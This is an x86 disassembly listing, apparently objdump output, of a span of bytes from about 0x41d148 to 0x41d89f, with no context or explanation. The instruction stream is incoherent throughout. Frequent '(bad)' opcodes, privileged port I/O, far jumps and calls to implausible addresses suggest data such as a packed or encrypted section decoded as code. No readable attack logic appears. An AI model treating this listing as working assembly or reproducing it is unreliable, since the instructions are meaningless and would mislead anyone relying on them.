  41d148:	xor    eax,DWORD PTR [edx]
  41d14a:	mov    al,ds:0x76f6ac72
  41d14f:	aam    0x21
  41d151:	ficomp DWORD PTR [eax-0x6caddcce]
  41d157:	pop    edi
  41d158:	mov    DWORD PTR [ecx],ebp
  41d15a:	jb     0x41d194
  41d15c:	jmp    0x41d13a
  41d15e:	mov    eax,0x26257fb5
  41d163:	(bad)  
  41d164:	iret   
  41d165:	in     al,dx
  41d166:	sub    eax,0xf2c250f4
  41d16b:	fistp  DWORD PTR [edi-0x7441f8b2]
  41d171:	dec    ebp
  41d172:	mov    BYTE PTR [ecx+0x596ef16a],bh
  41d178:	adc    ah,BYTE PTR [edi+0x3d]
  41d17b:	div    DWORD PTR [esp+ecx*2-0x20512b9f]
  41d182:	pop    ecx
  41d183:	ds aam 0x53
  41d186:	dec    edi
  41d187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d188:	mov    BYTE PTR [ebx],bh
  41d18a:	call   0x849afdec
  41d18f:	xchg   edx,eax
  41d190:	dec    edx
  41d191:	shl    dh,cl
  41d193:	stos   BYTE PTR es:[edi],al
  41d194:	inc    ebx
  41d195:	jne    0xdaf6f584
  41d19b:	pop    eax
  41d19c:	mov    bh,BYTE PTR [edx+0x68]
  41d19f:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41d1a1:	add    bl,BYTE PTR [ebx]
  41d1a3:	cmp    eax,0x360de703
  41d1a8:	test   DWORD PTR [edx],eax
  41d1aa:	in     al,dx
  41d1ab:	imul   eax,DWORD PTR [ebx],0xd81f786a
  41d1b1:	add    ebx,DWORD PTR [edi]
  41d1b3:	lahf   
  41d1b4:	xlat   BYTE PTR ds:[ebx]
  41d1b5:	test   cl,bl
  41d1b7:	or     bh,BYTE PTR [esi+0x7b]
  41d1ba:	pop    esp
  41d1bb:	adc    DWORD PTR [ebp+esi*8-0x53],edi
  41d1bf:	(bad)  
  41d1c0:	in     eax,dx
  41d1c1:	add    bl,BYTE PTR ds:0xac838a91
  41d1c7:	in     eax,dx
  41d1c8:	lock retf 0x977d
  41d1cc:	jnp    0x41d1a0
  41d1ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1cf:	aam    0xef
  41d1d1:	mov    ecx,0x365acf1
  41d1d6:	sub    BYTE PTR [edi-0x44],bh
  41d1d9:	mov    eax,ds:0x7ed9c3e6
  41d1de:	push   ds
  41d1df:	std    
  41d1e0:	lahf   
  41d1e1:	and    eax,0x2dba93ea
  41d1e6:	inc    eax
  41d1e7:	aam    0xda
  41d1e9:	sbb    BYTE PTR [esi+0x5e],dh
  41d1ec:	and    BYTE PTR [ebx-0x2a539cd4],dh
  41d1f2:	mov    ah,0x93
  41d1f4:	mov    BYTE PTR ds:0x956c1c12,al
  41d1fa:	add    dl,ah
  41d1fc:	mov    ebx,0x7379ffd7
  41d201:	xchg   ecx,eax
  41d202:	iret   
  41d203:	aaa    
  41d204:	mov    BYTE PTR [ebx-0x35111e98],ch
  41d20a:	sbb    DWORD PTR [esi+0x6b],ecx
  41d20d:	add    dl,BYTE PTR [esi]
  41d20f:	rol    DWORD PTR [eax+eiz*1+0x27],0xe8
  41d214:	repz xor ebx,DWORD PTR [eax+0x69]
  41d218:	shr    DWORD PTR [eax-0x1b],0xce
  41d21c:	test   ecx,ebp
  41d21e:	xor    DWORD PTR [esp+ebx*2+0x43d4a56f],esp
  41d225:	sbb    eax,0xd3027710
  41d22a:	jl     0x41d25d
  41d22c:	mov    DWORD PTR [edi],ebp
  41d22e:	or     al,BYTE PTR [ecx-0x7]
  41d231:	xchg   ecx,eax
  41d232:	sqrtps xmm2,xmm2
  41d235:	icebp  
  41d236:	pop    edi
  41d237:	fwait
  41d238:	test   BYTE PTR [esi+0x48],cl
  41d23b:	(bad)  
  41d23c:	xchg   esi,eax
  41d23d:	push   ebp
  41d23e:	sub    dh,cl
  41d240:	enter  0x70c5,0xaf
  41d244:	loope  0x41d289
  41d246:	pop    ds
  41d247:	in     eax,dx
  41d248:	mov    bh,0x8c
  41d24a:	xchg   edi,eax
  41d24b:	imul   ecx,DWORD PTR [edx+edi*1-0x7a],0xad5f14d4
  41d253:	ror    BYTE PTR [esi],0x82
  41d256:	add    al,0x30
  41d258:	mov    ch,dl
  41d25a:	push   esp
  41d25b:	arpl   cx,bp
  41d25d:	push   ebx
  41d25e:	test   DWORD PTR [edi-0x1e],edx
  41d261:	sbb    al,0xd2
  41d263:	sub    edx,DWORD PTR [edx+0x2e]
  41d266:	out    dx,al
  41d267:	out    dx,al
  41d268:	jmp    0x8950e977
  41d26d:	xchg   ecx,eax
  41d26e:	adc    DWORD PTR [ebx+esi*2-0x3e44ea69],ebp
  41d275:	add    eax,0x243bdbca
  41d27a:	call   0x76fe8f73
  41d27f:	jmp    0xd759ca8d
  41d284:	jae    0x41d20b
  41d286:	stos   BYTE PTR es:[edi],al
  41d287:	inc    DWORD PTR [ebp-0x30e3edec]
  41d28d:	or     ebx,esi
  41d28f:	mov    ch,0x8e
  41d291:	daa    
  41d292:	cli    
  41d293:	sub    dh,BYTE PTR [ebp-0x26]
  41d296:	ins    DWORD PTR es:[edi],dx
  41d297:	fscale 
  41d299:	mov    edx,0x5628ea95
  41d29e:	sbb    ecx,DWORD PTR [ebp+0x79]
  41d2a1:	sbb    al,0x54
  41d2a3:	addr16 icebp 
  41d2a5:	cmp    al,BYTE PTR [edi]
  41d2a7:	or     DWORD PTR [ecx-0x776766c2],edi
  41d2ad:	jae    0x41d2ff
  41d2af:	sbb    eax,0xe9a68315
  41d2b4:	ins    BYTE PTR es:[edi],dx
  41d2b5:	add    bl,BYTE PTR [ebp+edi*2-0x41eb07b7]
  41d2bc:	and    BYTE PTR [esi+ebx*1],bl
  41d2bf:	aaa    
  41d2c0:	mov    esp,0x24df9fed
  41d2c5:	mov    ds:0x4835d5b7,eax
  41d2ca:	shl    BYTE PTR [eax-0x38c001a9],cl
  41d2d0:	mov    DWORD PTR [ebx],esi
  41d2d2:	cmp    DWORD PTR [edx+0x55],esp
  41d2d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2d6:	mov    edi,0x10034e23
  41d2db:	rol    BYTE PTR [ebx],0xf3
  41d2de:	adc    cl,BYTE PTR [ecx]
  41d2e0:	in     al,dx
  41d2e1:	(bad)  
  41d2e2:	pop    ds
  41d2e3:	arpl   bx,di
  41d2e5:	mov    cs,WORD PTR [ebx-0x462e6359]
  41d2eb:	(bad)  
  41d2ed:	add    dl,dh
  41d2ef:	sub    DWORD PTR [edi],edi
  41d2f1:	push   esi
  41d2f2:	cmp    al,0xd0
  41d2f4:	retf   0x50e5
  41d2f7:	jnp    0x41d282
  41d2f9:	test   eax,0xbc4b2c54
  41d2fe:	inc    esi
  41d2ff:	fisttp QWORD PTR [ebx+eax*1-0x50]
  41d303:	jge    0x41d29c
  41d305:	pop    esi
  41d306:	sbb    edx,DWORD PTR [ebx]
  41d308:	test   ebp,eax
  41d30a:	outs   dx,BYTE PTR ds:[esi]
  41d30b:	(bad)  
  41d30c:	and    eax,DWORD PTR [edi-0x7570b63]
  41d312:	or     eax,0xa039ac4
  41d317:	aad    0xb3
  41d319:	and    BYTE PTR [esi-0x47],dl
  41d31c:	dec    ecx
  41d31d:	arpl   WORD PTR [ecx+edx*2-0x76],dx
  41d321:	jmp    0x41d2a4
  41d323:	adc    BYTE PTR [eax+eiz*1],ch
  41d326:	sbb    eax,0x295448d8
  41d32b:	lods   eax,DWORD PTR ds:[esi]
  41d32c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d32d:	xor    DWORD PTR [eax-0x7b],0x6b
  41d331:	push   edx
  41d332:	jg     0x41d2d2
  41d334:	mov    edi,0x884f1368
  41d339:	or     eax,0x85bfb3d1
  41d33e:	out    0xd9,al
  41d340:	imul   BYTE PTR cs:[ecx+ebx*4+0x6]
  41d345:	xlat   BYTE PTR ds:[ebx]
  41d346:	rcl    ch,1
  41d348:	aad    0x10
  41d34a:	jmp    0x771b:0x1f1d1387
  41d351:	scas   eax,DWORD PTR es:[edi]
  41d352:	inc    esp
  41d353:	sbb    esi,eax
  41d355:	sub    al,0xe
  41d357:	mov    edx,0xf1793ebe
  41d35c:	dec    ecx
  41d35d:	imul   edi,ebp,0xffffffa4
  41d360:	das    
  41d361:	gs pop eax
  41d363:	not    edx
  41d365:	mov    ebx,0x4b3e65e0
  41d36a:	mov    BYTE PTR [esi-0x4],ah
  41d36d:	add    dl,dl
  41d36f:	arpl   WORD PTR [edi],bp
  41d371:	push   cs
  41d372:	and    BYTE PTR [ebp+esi*2+0x21],al
  41d376:	pop    esp
  41d377:	jecxz  0x41d38e
  41d379:	and    eax,0x1a8970dd
  41d37e:	sbb    BYTE PTR [eax],ah
  41d380:	js     0x41d376
  41d382:	cmp    eax,0xd96177d7
  41d387:	(bad)  
  41d388:	nop
  41d389:	mov    bl,0xa2
  41d38b:	adc    al,0x88
  41d38d:	mov    eax,ds:0x27cdac0c
  41d392:	push   cs
  41d393:	mov    dl,0x5f
  41d395:	add    DWORD PTR [esi-0x4f],ebx
  41d398:	(bad)  
  41d399:	or     al,0x77
  41d39b:	out    0x76,al
  41d39d:	stos   DWORD PTR es:[edi],eax
  41d39e:	sub    dl,BYTE PTR [eax-0x40]
  41d3a1:	fnsave [esi+esi*4+0x1f0fc989]
  41d3a8:	pop    edx
  41d3a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3aa:	jns    0x41d383
  41d3ac:	inc    ebx
  41d3ad:	addr16 sub eax,0xe2a1f09e
  41d3b3:	cs pop esi
  41d3b5:	std    
  41d3b6:	pusha  
  41d3b7:	push   0x33
  41d3b9:	mov    ecx,0xc656f71f
  41d3be:	jbe    0x41d408
  41d3c0:	lods   al,BYTE PTR ds:[esi]
  41d3c1:	jl     0x41d407
  41d3c3:	in     eax,dx
  41d3c4:	xor    cl,BYTE PTR [esi]
  41d3c6:	push   0xeffe05ad
  41d3cb:	jle    0x41d404
  41d3cd:	adc    BYTE PTR [edx],0x7d
  41d3d0:	add    ch,ah
  41d3d2:	data16 jge 0x41d395
  41d3d5:	dec    esi
  41d3d6:	in     al,dx
  41d3d7:	inc    edi
  41d3d8:	sahf   
  41d3d9:	adc    ah,BYTE PTR [edi+0x67]
  41d3dc:	daa    
  41d3dd:	ds mov esi,0xe1d45e7
  41d3e3:	cmp    BYTE PTR [ebx+0x5024ee4f],dl
  41d3e9:	imul   eax,DWORD PTR [eax+eax*1],0xffffffae
  41d3ed:	out    dx,eax
  41d3ee:	std    
  41d3ef:	(bad)  
  41d3f0:	mov    DWORD PTR [ecx],edx
  41d3f2:	btr    DWORD PTR [eax],edx
  41d3f5:	int3   
  41d3f6:	dec    ebp
  41d3f7:	mov    esi,esi
  41d3f9:	les    eax,FWORD PTR [edi]
  41d3fb:	aam    0x75
  41d3fd:	mov    ecx,0xfaf3c813
  41d402:	push   es
  41d403:	dec    esi
  41d404:	mov    DWORD PTR [edi-0x620cf7ae],ebp
  41d40a:	mov    ebp,0x14058c42
  41d40f:	scas   al,BYTE PTR es:[edi]
  41d410:	adc    al,0x29
  41d412:	push   eax
  41d413:	cdq    
  41d414:	inc    ebx
  41d415:	xlat   BYTE PTR ds:[ebx]
  41d416:	pop    ds
  41d417:	sbb    DWORD PTR [ebp+0x1b],esi
  41d41a:	dec    edx
  41d41b:	push   0xd43d3cc8
  41d420:	jmp    0x41d465
  41d422:	lds    ecx,FWORD PTR [eax+esi*8]
  41d425:	arpl   WORD PTR [edi-0x64da489c],sp
  41d42b:	popf   
  41d42c:	cld    
  41d42d:	add    dh,bl
  41d42f:	mov    BYTE PTR [ebp-0x6a],dh
  41d432:	inc    edi
  41d433:	mov    ebp,0xd5ec4778
  41d438:	aam    0x8e
  41d43a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d43b:	inc    ecx
  41d43c:	mov    cl,0x45
  41d43e:	(bad)  
  41d43f:	or     edx,DWORD PTR [ebp+0x363f6deb]
  41d445:	push   ebp
  41d446:	daa    
  41d447:	dec    ebp
  41d448:	addr16 sbb al,0xe1
  41d44b:	(bad)  
  41d44d:	mov    ebx,0x89c8c0c9
  41d452:	neg    DWORD PTR [esi+0x4d79e2b]
  41d458:	fsub   DWORD PTR [ebp-0x16]
  41d45b:	push   ecx
  41d45c:	mov    ?,WORD PTR [edi+0x41]
  41d45f:	pusha  
  41d460:	sub    bh,BYTE PTR [ecx-0x6dd3da92]
  41d466:	pushf  
  41d467:	scas   al,BYTE PTR es:[edi]
  41d468:	data16 xor BYTE PTR [edi-0x34],ah
  41d46c:	sbb    bl,BYTE PTR ds:0xdf18651d
  41d472:	cli    
  41d473:	or     cl,BYTE PTR [ecx-0x7cb498c9]
  41d479:	xchg   ebx,eax
  41d47a:	ret    
  41d47b:	dec    edi
  41d47c:	lock pop ds
  41d47e:	and    BYTE PTR [eax-0x32b22140],dl
  41d484:	cmp    bh,dl
  41d486:	push   esp
  41d487:	test   DWORD PTR [eax+0x14f88891],ecx
  41d48d:	push   edi
  41d48e:	jno    0x41d48f
  41d490:	fsub   DWORD PTR [ebp-0x63]
  41d493:	lock outs dx,DWORD PTR ds:[esi]
  41d495:	add    edx,DWORD PTR [edx]
  41d497:	fsub   QWORD PTR [edi+0xd6e2427]
  41d49d:	and    BYTE PTR [edi],bl
  41d49f:	(bad)  
  41d4a0:	pushf  
  41d4a1:	aam    0xfc
  41d4a3:	fisub  WORD PTR [edx+0x1fd5c9c2]
  41d4a9:	loopne 0x41d4d8
  41d4ab:	jl     0x41d4df
  41d4ad:	mov    ch,0x48
  41d4af:	cmp    eax,0x7522b988
  41d4b4:	inc    eax
  41d4b5:	xlat   BYTE PTR ds:[ebx]
  41d4b6:	stc    
  41d4b7:	jecxz  0x41d4e3
  41d4b9:	stos   DWORD PTR es:[edi],eax
  41d4ba:	(bad)
  41d4be:	out    0xd5,eax
  41d4c0:	sbb    ebx,0x5fa1a0d7
  41d4c6:	xchg   edi,eax
  41d4c7:	int    0x12
  41d4c9:	add    ebx,DWORD PTR [edi+0x30483835]
  41d4cf:	std    
  41d4d0:	jp     0x41d50f
  41d4d2:	jo     0x41d4d7
  41d4d4:	mov    ds:0x12764402,eax
  41d4d9:	add    BYTE PTR [edi-0x46],dh
  41d4dc:	(bad)  
  41d4dd:	in     eax,0xe1
  41d4df:	jmp    0x42ce7d3e
  41d4e4:	xor    DWORD PTR [ebx],eax
  41d4e6:	and    eax,0x8ef21ec9
  41d4eb:	aam    0x9b
  41d4ed:	xlat   BYTE PTR ds:[ebx]
  41d4ee:	push   es
  41d4ef:	in     al,dx
  41d4f0:	mov    bl,0x83
  41d4f2:	and    BYTE PTR [ecx+0x3d69c988],bh
  41d4f8:	or     al,dl
  41d4fa:	shr    BYTE PTR [edx-0x7e],1
  41d4fd:	add    dh,BYTE PTR [esi+ecx*8-0x47729895]
  41d504:	hlt    
  41d505:	std    
  41d506:	pop    esi
  41d507:	ret    
  41d508:	jnp    0x41d4f2
  41d50a:	pusha  
  41d50b:	test   eax,0x8242aced
  41d510:	loopne 0x41d583
  41d512:	adc    ecx,DWORD PTR ds:[eax+0x25e128ec]
  41d519:	add    BYTE PTR [edi-0x45],ch
  41d51c:	mov    edx,DWORD PTR [edi-0x76]
  41d51f:	jbe    0x41d55e
  41d521:	add    al,0x20
  41d523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d524:	push   0x6dd5d678
  41d529:	jp     0x41d524
  41d52b:	mov    ds:0xe86a7f14,al
  41d530:	or     BYTE PTR [ecx-0x5f2933fb],0x6d
  41d537:	inc    ecx
  41d538:	rol    DWORD PTR [esi-0x21],cl
  41d53b:	xchg   ebx,eax
  41d53c:	retf   0x188b
  41d53f:	inc    edi
  41d540:	push   ebx
  41d541:	add    ch,dl
  41d543:	dec    ebp
  41d544:	stc    
  41d545:	pop    ds
  41d546:	je     0x41d50a
  41d548:	popa   
  41d549:	not    BYTE PTR [ecx]
  41d54b:	inc    edx
  41d54c:	lea    ebp,[ecx]
  41d54e:	xlat   BYTE PTR ds:[ebx]
  41d54f:	xor    BYTE PTR [edi+0x5a],dh
  41d552:	and    DWORD PTR [ecx+eax*4],edx
  41d555:	inc    esp
  41d556:	dec    ebp
  41d557:	and    al,0xc2
  41d559:	inc    edx
  41d55a:	push   ds
  41d55b:	jmp    FWORD PTR [eax]
  41d55d:	(bad)  
  41d55e:	jb     0x41d5be
  41d560:	retf   0x1f99
  41d563:	leave  
  41d564:	lods   al,BYTE PTR ds:[esi]
  41d565:	xlat   BYTE PTR ds:[ebx]
  41d566:	stc    
  41d567:	adc    esi,eax
  41d569:	jge    0x41d5bd
  41d56b:	stos   BYTE PTR es:[edi],al
  41d56c:	pop    esi
  41d56d:	sbb    bl,BYTE PTR [ebx+0x52]
  41d570:	mov    edx,esp
  41d572:	fst    QWORD PTR [ebp-0x5e]
  41d575:	mov    ecx,0x61954416
  41d57a:	jae    0x41d5f2
  41d57c:	(bad)  
  41d57e:	mov    BYTE PTR [ecx-0x77],0x95
  41d582:	jecxz  0x41d50e
  41d584:	pop    ss
  41d585:	add    esi,edx
  41d587:	jp     0x41d50a
  41d589:	adc    BYTE PTR [edx-0x78fd065e],ah
  41d58f:	or     eax,0x2080f77a
  41d594:	mov    eax,ds:0x5f46c00
  41d599:	ins    DWORD PTR es:[edi],dx
  41d59a:	data16 (bad) 
  41d59c:	daa    
  41d59d:	jecxz  0x41d5b0
  41d59f:	dec    ecx
  41d5a0:	xchg   ebx,edi
  41d5a2:	mov    bl,0x7f
  41d5a4:	(bad)  
  41d5a5:	ficomp WORD PTR [edi-0x5adc9d4e]
  41d5ab:	aam    0xc2
  41d5ad:	rcr    ecx,1
  41d5af:	inc    edx
  41d5b0:	xchg   edx,eax
  41d5b1:	cdq    
  41d5b2:	sbb    eax,0x38bf8907
  41d5b7:	adc    al,0x5b
  41d5b9:	aam    0xc4
  41d5bb:	cmp    al,0xfc
  41d5bd:	add    ah,BYTE PTR [eax+esi*2-0xe]
  41d5c1:	jo     0x41d565
  41d5c3:	mov    al,BYTE PTR [esi]
  41d5c5:	repz pop ds
  41d5c7:	adc    ebp,DWORD PTR [ebp-0x3b1f863c]
  41d5cd:	mov    esp,0x4d3ebb17
  41d5d2:	sar    DWORD PTR [edx-0x25a06f37],cl
  41d5d8:	icebp  
  41d5d9:	xlat   BYTE PTR ds:[ebx]
  41d5da:	ins    DWORD PTR es:[edi],dx
  41d5db:	(bad)  
  41d5dc:	mov    al,0xe8
  41d5de:	lock pop edi
  41d5e0:	mov    cl,bl
  41d5e2:	add    al,0x3e
  41d5e4:	push   0xa4d5defa
  41d5e9:	imul   esp,DWORD PTR [ebx+eax*2-0x65],0x97cdfef2
  41d5f1:	jae    0x41d628
  41d5f3:	(bad)  
  41d5f4:	sbb    DWORD PTR [edx],eax
  41d5f6:	cli    
  41d5f7:	sti    
  41d5f8:	jbe    0x41d60c
  41d5fa:	call   0xef996d3
  41d5ff:	loopne 0x41d5ff
  41d601:	and    BYTE PTR [ecx],dh
  41d603:	inc    edi
  41d604:	scas   al,BYTE PTR es:[edi]
  41d605:	sti    
  41d606:	daa    
  41d607:	sbb    al,0x70
  41d609:	lahf   
  41d60a:	pop    ds
  41d60b:	cmp    eax,0x650707f3
  41d610:	pop    esp
  41d611:	pop    esi
  41d612:	pop    ds
  41d613:	pop    edi
  41d614:	cmp    ebx,esi
  41d616:	test   BYTE PTR [ebp-0x2eed9fde],0x6b
  41d61d:	pop    ebp
  41d61e:	dec    ebx
  41d61f:	cwde   
  41d620:	popa   
  41d621:	or     al,0xed
  41d623:	adc    eax,0x4d8f89a2
  41d628:	mov    esp,0x9ddc844
  41d62d:	out    dx,eax
  41d62e:	in     al,dx
  41d62f:	mov    ebx,0xc0de86b5
  41d634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d635:	add    ah,bh
  41d637:	adc    eax,esi
  41d639:	push   esp
  41d63a:	sbb    bl,BYTE PTR [eax-0x14e16486]
  41d640:	mov    DWORD PTR [edi],ebx
  41d642:	in     eax,dx
  41d643:	std    
  41d644:	push   cs
  41d645:	inc    edi
  41d646:	mov    bh,0x3b
  41d648:	cli    
  41d649:	or     BYTE PTR [esi+edi*2-0x22],0x49
  41d64e:	jb     0x41d65f
  41d650:	add    BYTE PTR [edi],0x1a
  41d653:	lods   al,BYTE PTR ds:[esi]
  41d654:	jg     0x41d5df
  41d656:	pusha  
  41d657:	pushf  
  41d658:	test   al,0x5c
  41d65a:	pushf  
  41d65b:	int    0xba
  41d65d:	add    dh,BYTE PTR [esi]
  41d65f:	xor    DWORD PTR [edi],esp
  41d661:	adc    bh,dl
  41d663:	test   BYTE PTR [ebx+0x107160c8],cl
  41d669:	jge    0x41d6d3
  41d66b:	add    eax,0xd412a540
  41d670:	sbb    DWORD PTR [edi-0x4630fbcb],eax
  41d676:	jne    0x41d64f
  41d678:	mov    bh,0x6f
  41d67a:	cmp    BYTE PTR [edi-0x77],cl
  41d67d:	(bad)  
  41d67e:	mov    ebx,cs
  41d680:	push   ss
  41d681:	cld    
  41d682:	arpl   sp,dx
  41d684:	mov    ch,0xcd
  41d686:	push   ss
  41d687:	ins    DWORD PTR es:[edi],dx
  41d688:	push   edx
  41d689:	sbb    cl,BYTE PTR [edi-0x15e27723]
  41d68f:	retf   0xd7ff
  41d692:	dec    edx
  41d693:	xchg   ecx,eax
  41d694:	pop    ebx
  41d695:	inc    esp
  41d696:	test   BYTE PTR [edi-0x5ba0fdda],dh
  41d69c:	stos   BYTE PTR es:[edi],al
  41d69d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d69e:	xor    edi,DWORD PTR [eax-0x34c067a]
  41d6a4:	pop    es
  41d6a5:	push   ebx
  41d6a6:	loopne 0x41d635
  41d6a8:	fndisi(8087 only) 
  41d6aa:	and    BYTE PTR [edx-0x637b28e4],ah
  41d6b0:	mov    cl,0x39
  41d6b2:	xchg   edx,eax
  41d6b3:	push   ebp
  41d6b4:	call   0x61e6:0xe4ed2be7
  41d6bb:	xchg   ebx,eax
  41d6bc:	pop    ds
  41d6bd:	add    BYTE PTR [edi-0x605784a4],cl
  41d6c3:	xor    al,0x41
  41d6c5:	jb     0x41d6e3
  41d6c7:	dec    ecx
  41d6c8:	push   ebp
  41d6c9:	sbb    al,0x2c
  41d6cb:	mov    eax,ds:0x727c15c3
  41d6d0:	or     DWORD PTR [ebx],eax
  41d6d2:	outs   dx,BYTE PTR ds:[esi]
  41d6d3:	xor    eax,0xd23d9c02
  41d6d8:	push   ebx
  41d6d9:	loop   0x41d6fc
  41d6db:	adc    ah,BYTE PTR [ecx+0x7e]
  41d6de:	push   ds
  41d6df:	ret    0xf73d
  41d6e2:	pusha  
  41d6e3:	inc    ecx
  41d6e4:	jo     0x41d6b9
  41d6e6:	jmp    0xfeca178b
  41d6eb:	aam    0x2f
  41d6ed:	pop    ss
  41d6ee:	add    ah,cl
  41d6f0:	int3   
  41d6f1:	out    0x41,al
  41d6f3:	xor    eax,0xc9ebab89
  41d6f8:	rol    DWORD PTR [esi-0x7399bc],cl
  41d6fe:	sti    
  41d6ff:	aam    0x2b
  41d701:	cld    
  41d702:	xor    al,0x57
  41d704:	pushf  
  41d705:	or     al,0xe0
  41d707:	js     0x41d692
  41d709:	pop    ss
  41d70a:	stos   BYTE PTR es:[edi],al
  41d70b:	out    dx,al
  41d70c:	push   0xd01ba0af
  41d711:	push   ds
  41d712:	mov    dl,0x65
  41d714:	push   0x910ed62
  41d719:	into   
  41d71a:	or     edx,DWORD PTR [edx]
  41d71c:	mov    BYTE PTR [ebx+0x34],ch
  41d71f:	inc    esp
  41d720:	and    BYTE PTR [ebx],dh
  41d722:	pushf  
  41d723:	sbb    eax,DWORD PTR [ebx-0x1a9e0ffe]
  41d729:	(bad)  
  41d72a:	frstor [ecx-0x422ff0a3]
  41d730:	or     al,BYTE PTR [ebx]
  41d732:	push   esp
  41d733:	cmp    DWORD PTR [ecx-0x62],esi
  41d736:	or     al,BYTE PTR [ebx]
  41d738:	mov    bh,0x52
  41d73a:	lods   al,BYTE PTR ds:[esi]
  41d73b:	xchg   esi,eax
  41d73c:	hlt    
  41d73d:	bound  ecx,QWORD PTR [ecx-0x41b84a45]
  41d743:	fs enter 0xec93,0x4a
  41d748:	xor    DWORD PTR [esi],edi
  41d74a:	push   ds
  41d74b:	test   DWORD PTR [edx+0x4e],0x32dfab6f
  41d752:	test   BYTE PTR [eax+esi*4],0xa7
  41d756:	pop    esp
  41d757:	sti    
  41d758:	test   DWORD PTR [edx],0x2a2b7ca2
  41d75e:	mov    ebp,ebp
  41d760:	mov    BYTE PTR [ebx],dh
  41d762:	es mov ebp,0xb3a8912a
  41d768:	mov    ebp,0x534297f5
  41d76d:	xchg   edi,eax
  41d76e:	pusha  
  41d76f:	pusha  
  41d770:	adc    al,0xf6
  41d772:	lahf   
  41d773:	add    dl,BYTE PTR [esi+0x75]
  41d776:	pop    ds
  41d777:	dec    ecx
  41d778:	(bad)  
  41d779:	cld    
  41d77a:	pop    edi
  41d77b:	test   BYTE PTR [esi-0x102a0729],0x50
  41d782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d783:	(bad)  
  41d784:	dec    edi
  41d785:	add    al,0x19
  41d787:	xchg   ecx,eax
  41d788:	mov    ecx,edx
  41d78a:	dec    edi
  41d78b:	mov    ebp,0xd3bdf273
  41d790:	rol    BYTE PTR ds:0xfa9b5520,0x3e
  41d797:	jle    0x41d7bb
  41d799:	mov    al,ds:0x5d240711
  41d79e:	push   ds
  41d79f:	jecxz  0x41d78c
  41d7a1:	add    DWORD PTR [edi-0x76],ebp
  41d7a4:	and    DWORD PTR [esi+eax*2],esi
  41d7a7:	inc    ebx
  41d7a8:	jno    0x41d7d9
  41d7aa:	push   es
  41d7ab:	aad    0xba
  41d7ad:	add    eax,0x7afa0fd0
  41d7b2:	rcr    DWORD PTR [esi],0x6e
  41d7b5:	jmp    DWORD PTR [eax-0xb]
  41d7b8:	or     ah,dh
  41d7ba:	and    al,0x25
  41d7bc:	lods   al,BYTE PTR ds:[esi]
  41d7bd:	dec    ebx
  41d7be:	test   ebp,edx
  41d7c0:	jmp    0xe37098bc
  41d7c5:	retf   0x5067
  41d7c8:	mov    DWORD PTR [ecx],ebx
  41d7ca:	lea    ebx,[eax-0x3]
  41d7cd:	or     DWORD PTR [ebx],esp
  41d7cf:	cmc    
  41d7d0:	out    0x1d,eax
  41d7d2:	pop    edx
  41d7d3:	or     DWORD PTR [ebx+0x17],edi
  41d7d6:	cli    
  41d7d7:	aad    0xa7
  41d7d9:	js     0x41d800
  41d7db:	js     0x29ec5386
  41d7e1:	imul   ebp,DWORD PTR [esi+0x6c],0x486a02d1
  41d7e8:	aam    0xc0
  41d7ea:	enter  0x5bfc,0xdf
  41d7ee:	sub    al,0x3
  41d7f0:	mov    ecx,0x903adb3
  41d7f5:	jb     0x41d7f5
  41d7f7:	lahf   
  41d7f8:	dec    ebp
  41d7f9:	add    DWORD PTR [edi],ebx
  41d7fb:	mov    esp,0x3772ee25
  41d800:	fwait
  41d801:	ret    
  41d802:	dec    ebx
  41d803:	sub    bh,BYTE PTR [edx+0x52b94e00]
  41d809:	clc    
  41d80a:	shl    BYTE PTR [esi+eax*2],1
  41d80d:	inc    ebx
  41d80e:	popf   
  41d80f:	and    BYTE PTR [esi-0x76fa5e79],ch
  41d815:	jbe    0x41d832
  41d817:	loopne 0x41d7c9
  41d819:	fnsave [edx]
  41d81b:	xchg   WORD PTR [edi],si
  41d81e:	xlat   BYTE PTR ds:[ebx]
  41d81f:	cmp    eax,0x46ff7e94
  41d824:	(bad)  
  41d825:	gs xor edx,edi
  41d828:	xchg   ebx,eax
  41d829:	es mov dl,0x7c
  41d82c:	push   ds
  41d82d:	xchg   esi,eax
  41d82e:	shr    ch,0x89
  41d831:	aad    0xa
  41d833:	mov    ds:0xeb1bbab0,eax
  41d838:	adc    DWORD PTR [ebx],ebx
  41d83a:	out    0x26,al
  41d83c:	pop    es
  41d83d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d83e:	mov    ebx,0xdb4fa1d4
  41d843:	push   es
  41d844:	mov    BYTE PTR [ecx-0x14e8f90a],al
  41d84a:	jmp    0x41d866
  41d84c:	add    eax,DWORD PTR [eax]
  41d84e:	jo     0x41d812
  41d850:	(bad)  
  41d851:	adc    DWORD PTR ds:0x7b022ed9,esp
  41d857:	test   al,0x1c
  41d859:	aam    0xb8
  41d85b:	fs jmp 0x4c150685
  41d861:	fs in  al,0x2f
  41d864:	mov    dh,0xf3
  41d866:	out    dx,eax
  41d867:	or     al,0x58
  41d869:	xchg   BYTE PTR [eax-0xd],ah
  41d86c:	cwde   
  41d86d:	xor    bl,bl
  41d86f:	or     cl,BYTE PTR [eax+0x72]
  41d872:	adc    DWORD PTR [ebp+0x4a93d479],esp
  41d878:	push   ss
  41d879:	bound  eax,QWORD PTR [edx+eax*1]
  41d87c:	(bad)  
  41d87d:	xchg   ecx,eax
  41d87e:	pop    ss
  41d87f:	xchg   edx,eax
  41d880:	mov    ebp,edi
  41d882:	and    eax,0x8eb65ed6
  41d887:	es test al,0x5
  41d88a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d88b:	jmp    FWORD PTR [ecx]
  41d88d:	fcomip st,st(1)
  41d88f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d890:	pushf  
  41d891:	mov    eax,0x51aebb6d
  41d896:	inc    edx
  41d897:	fimul  WORD PTR [ecx+0x6]
  41d89a:	or     eax,0x5602e473
  41d89f:	in     al,0x69
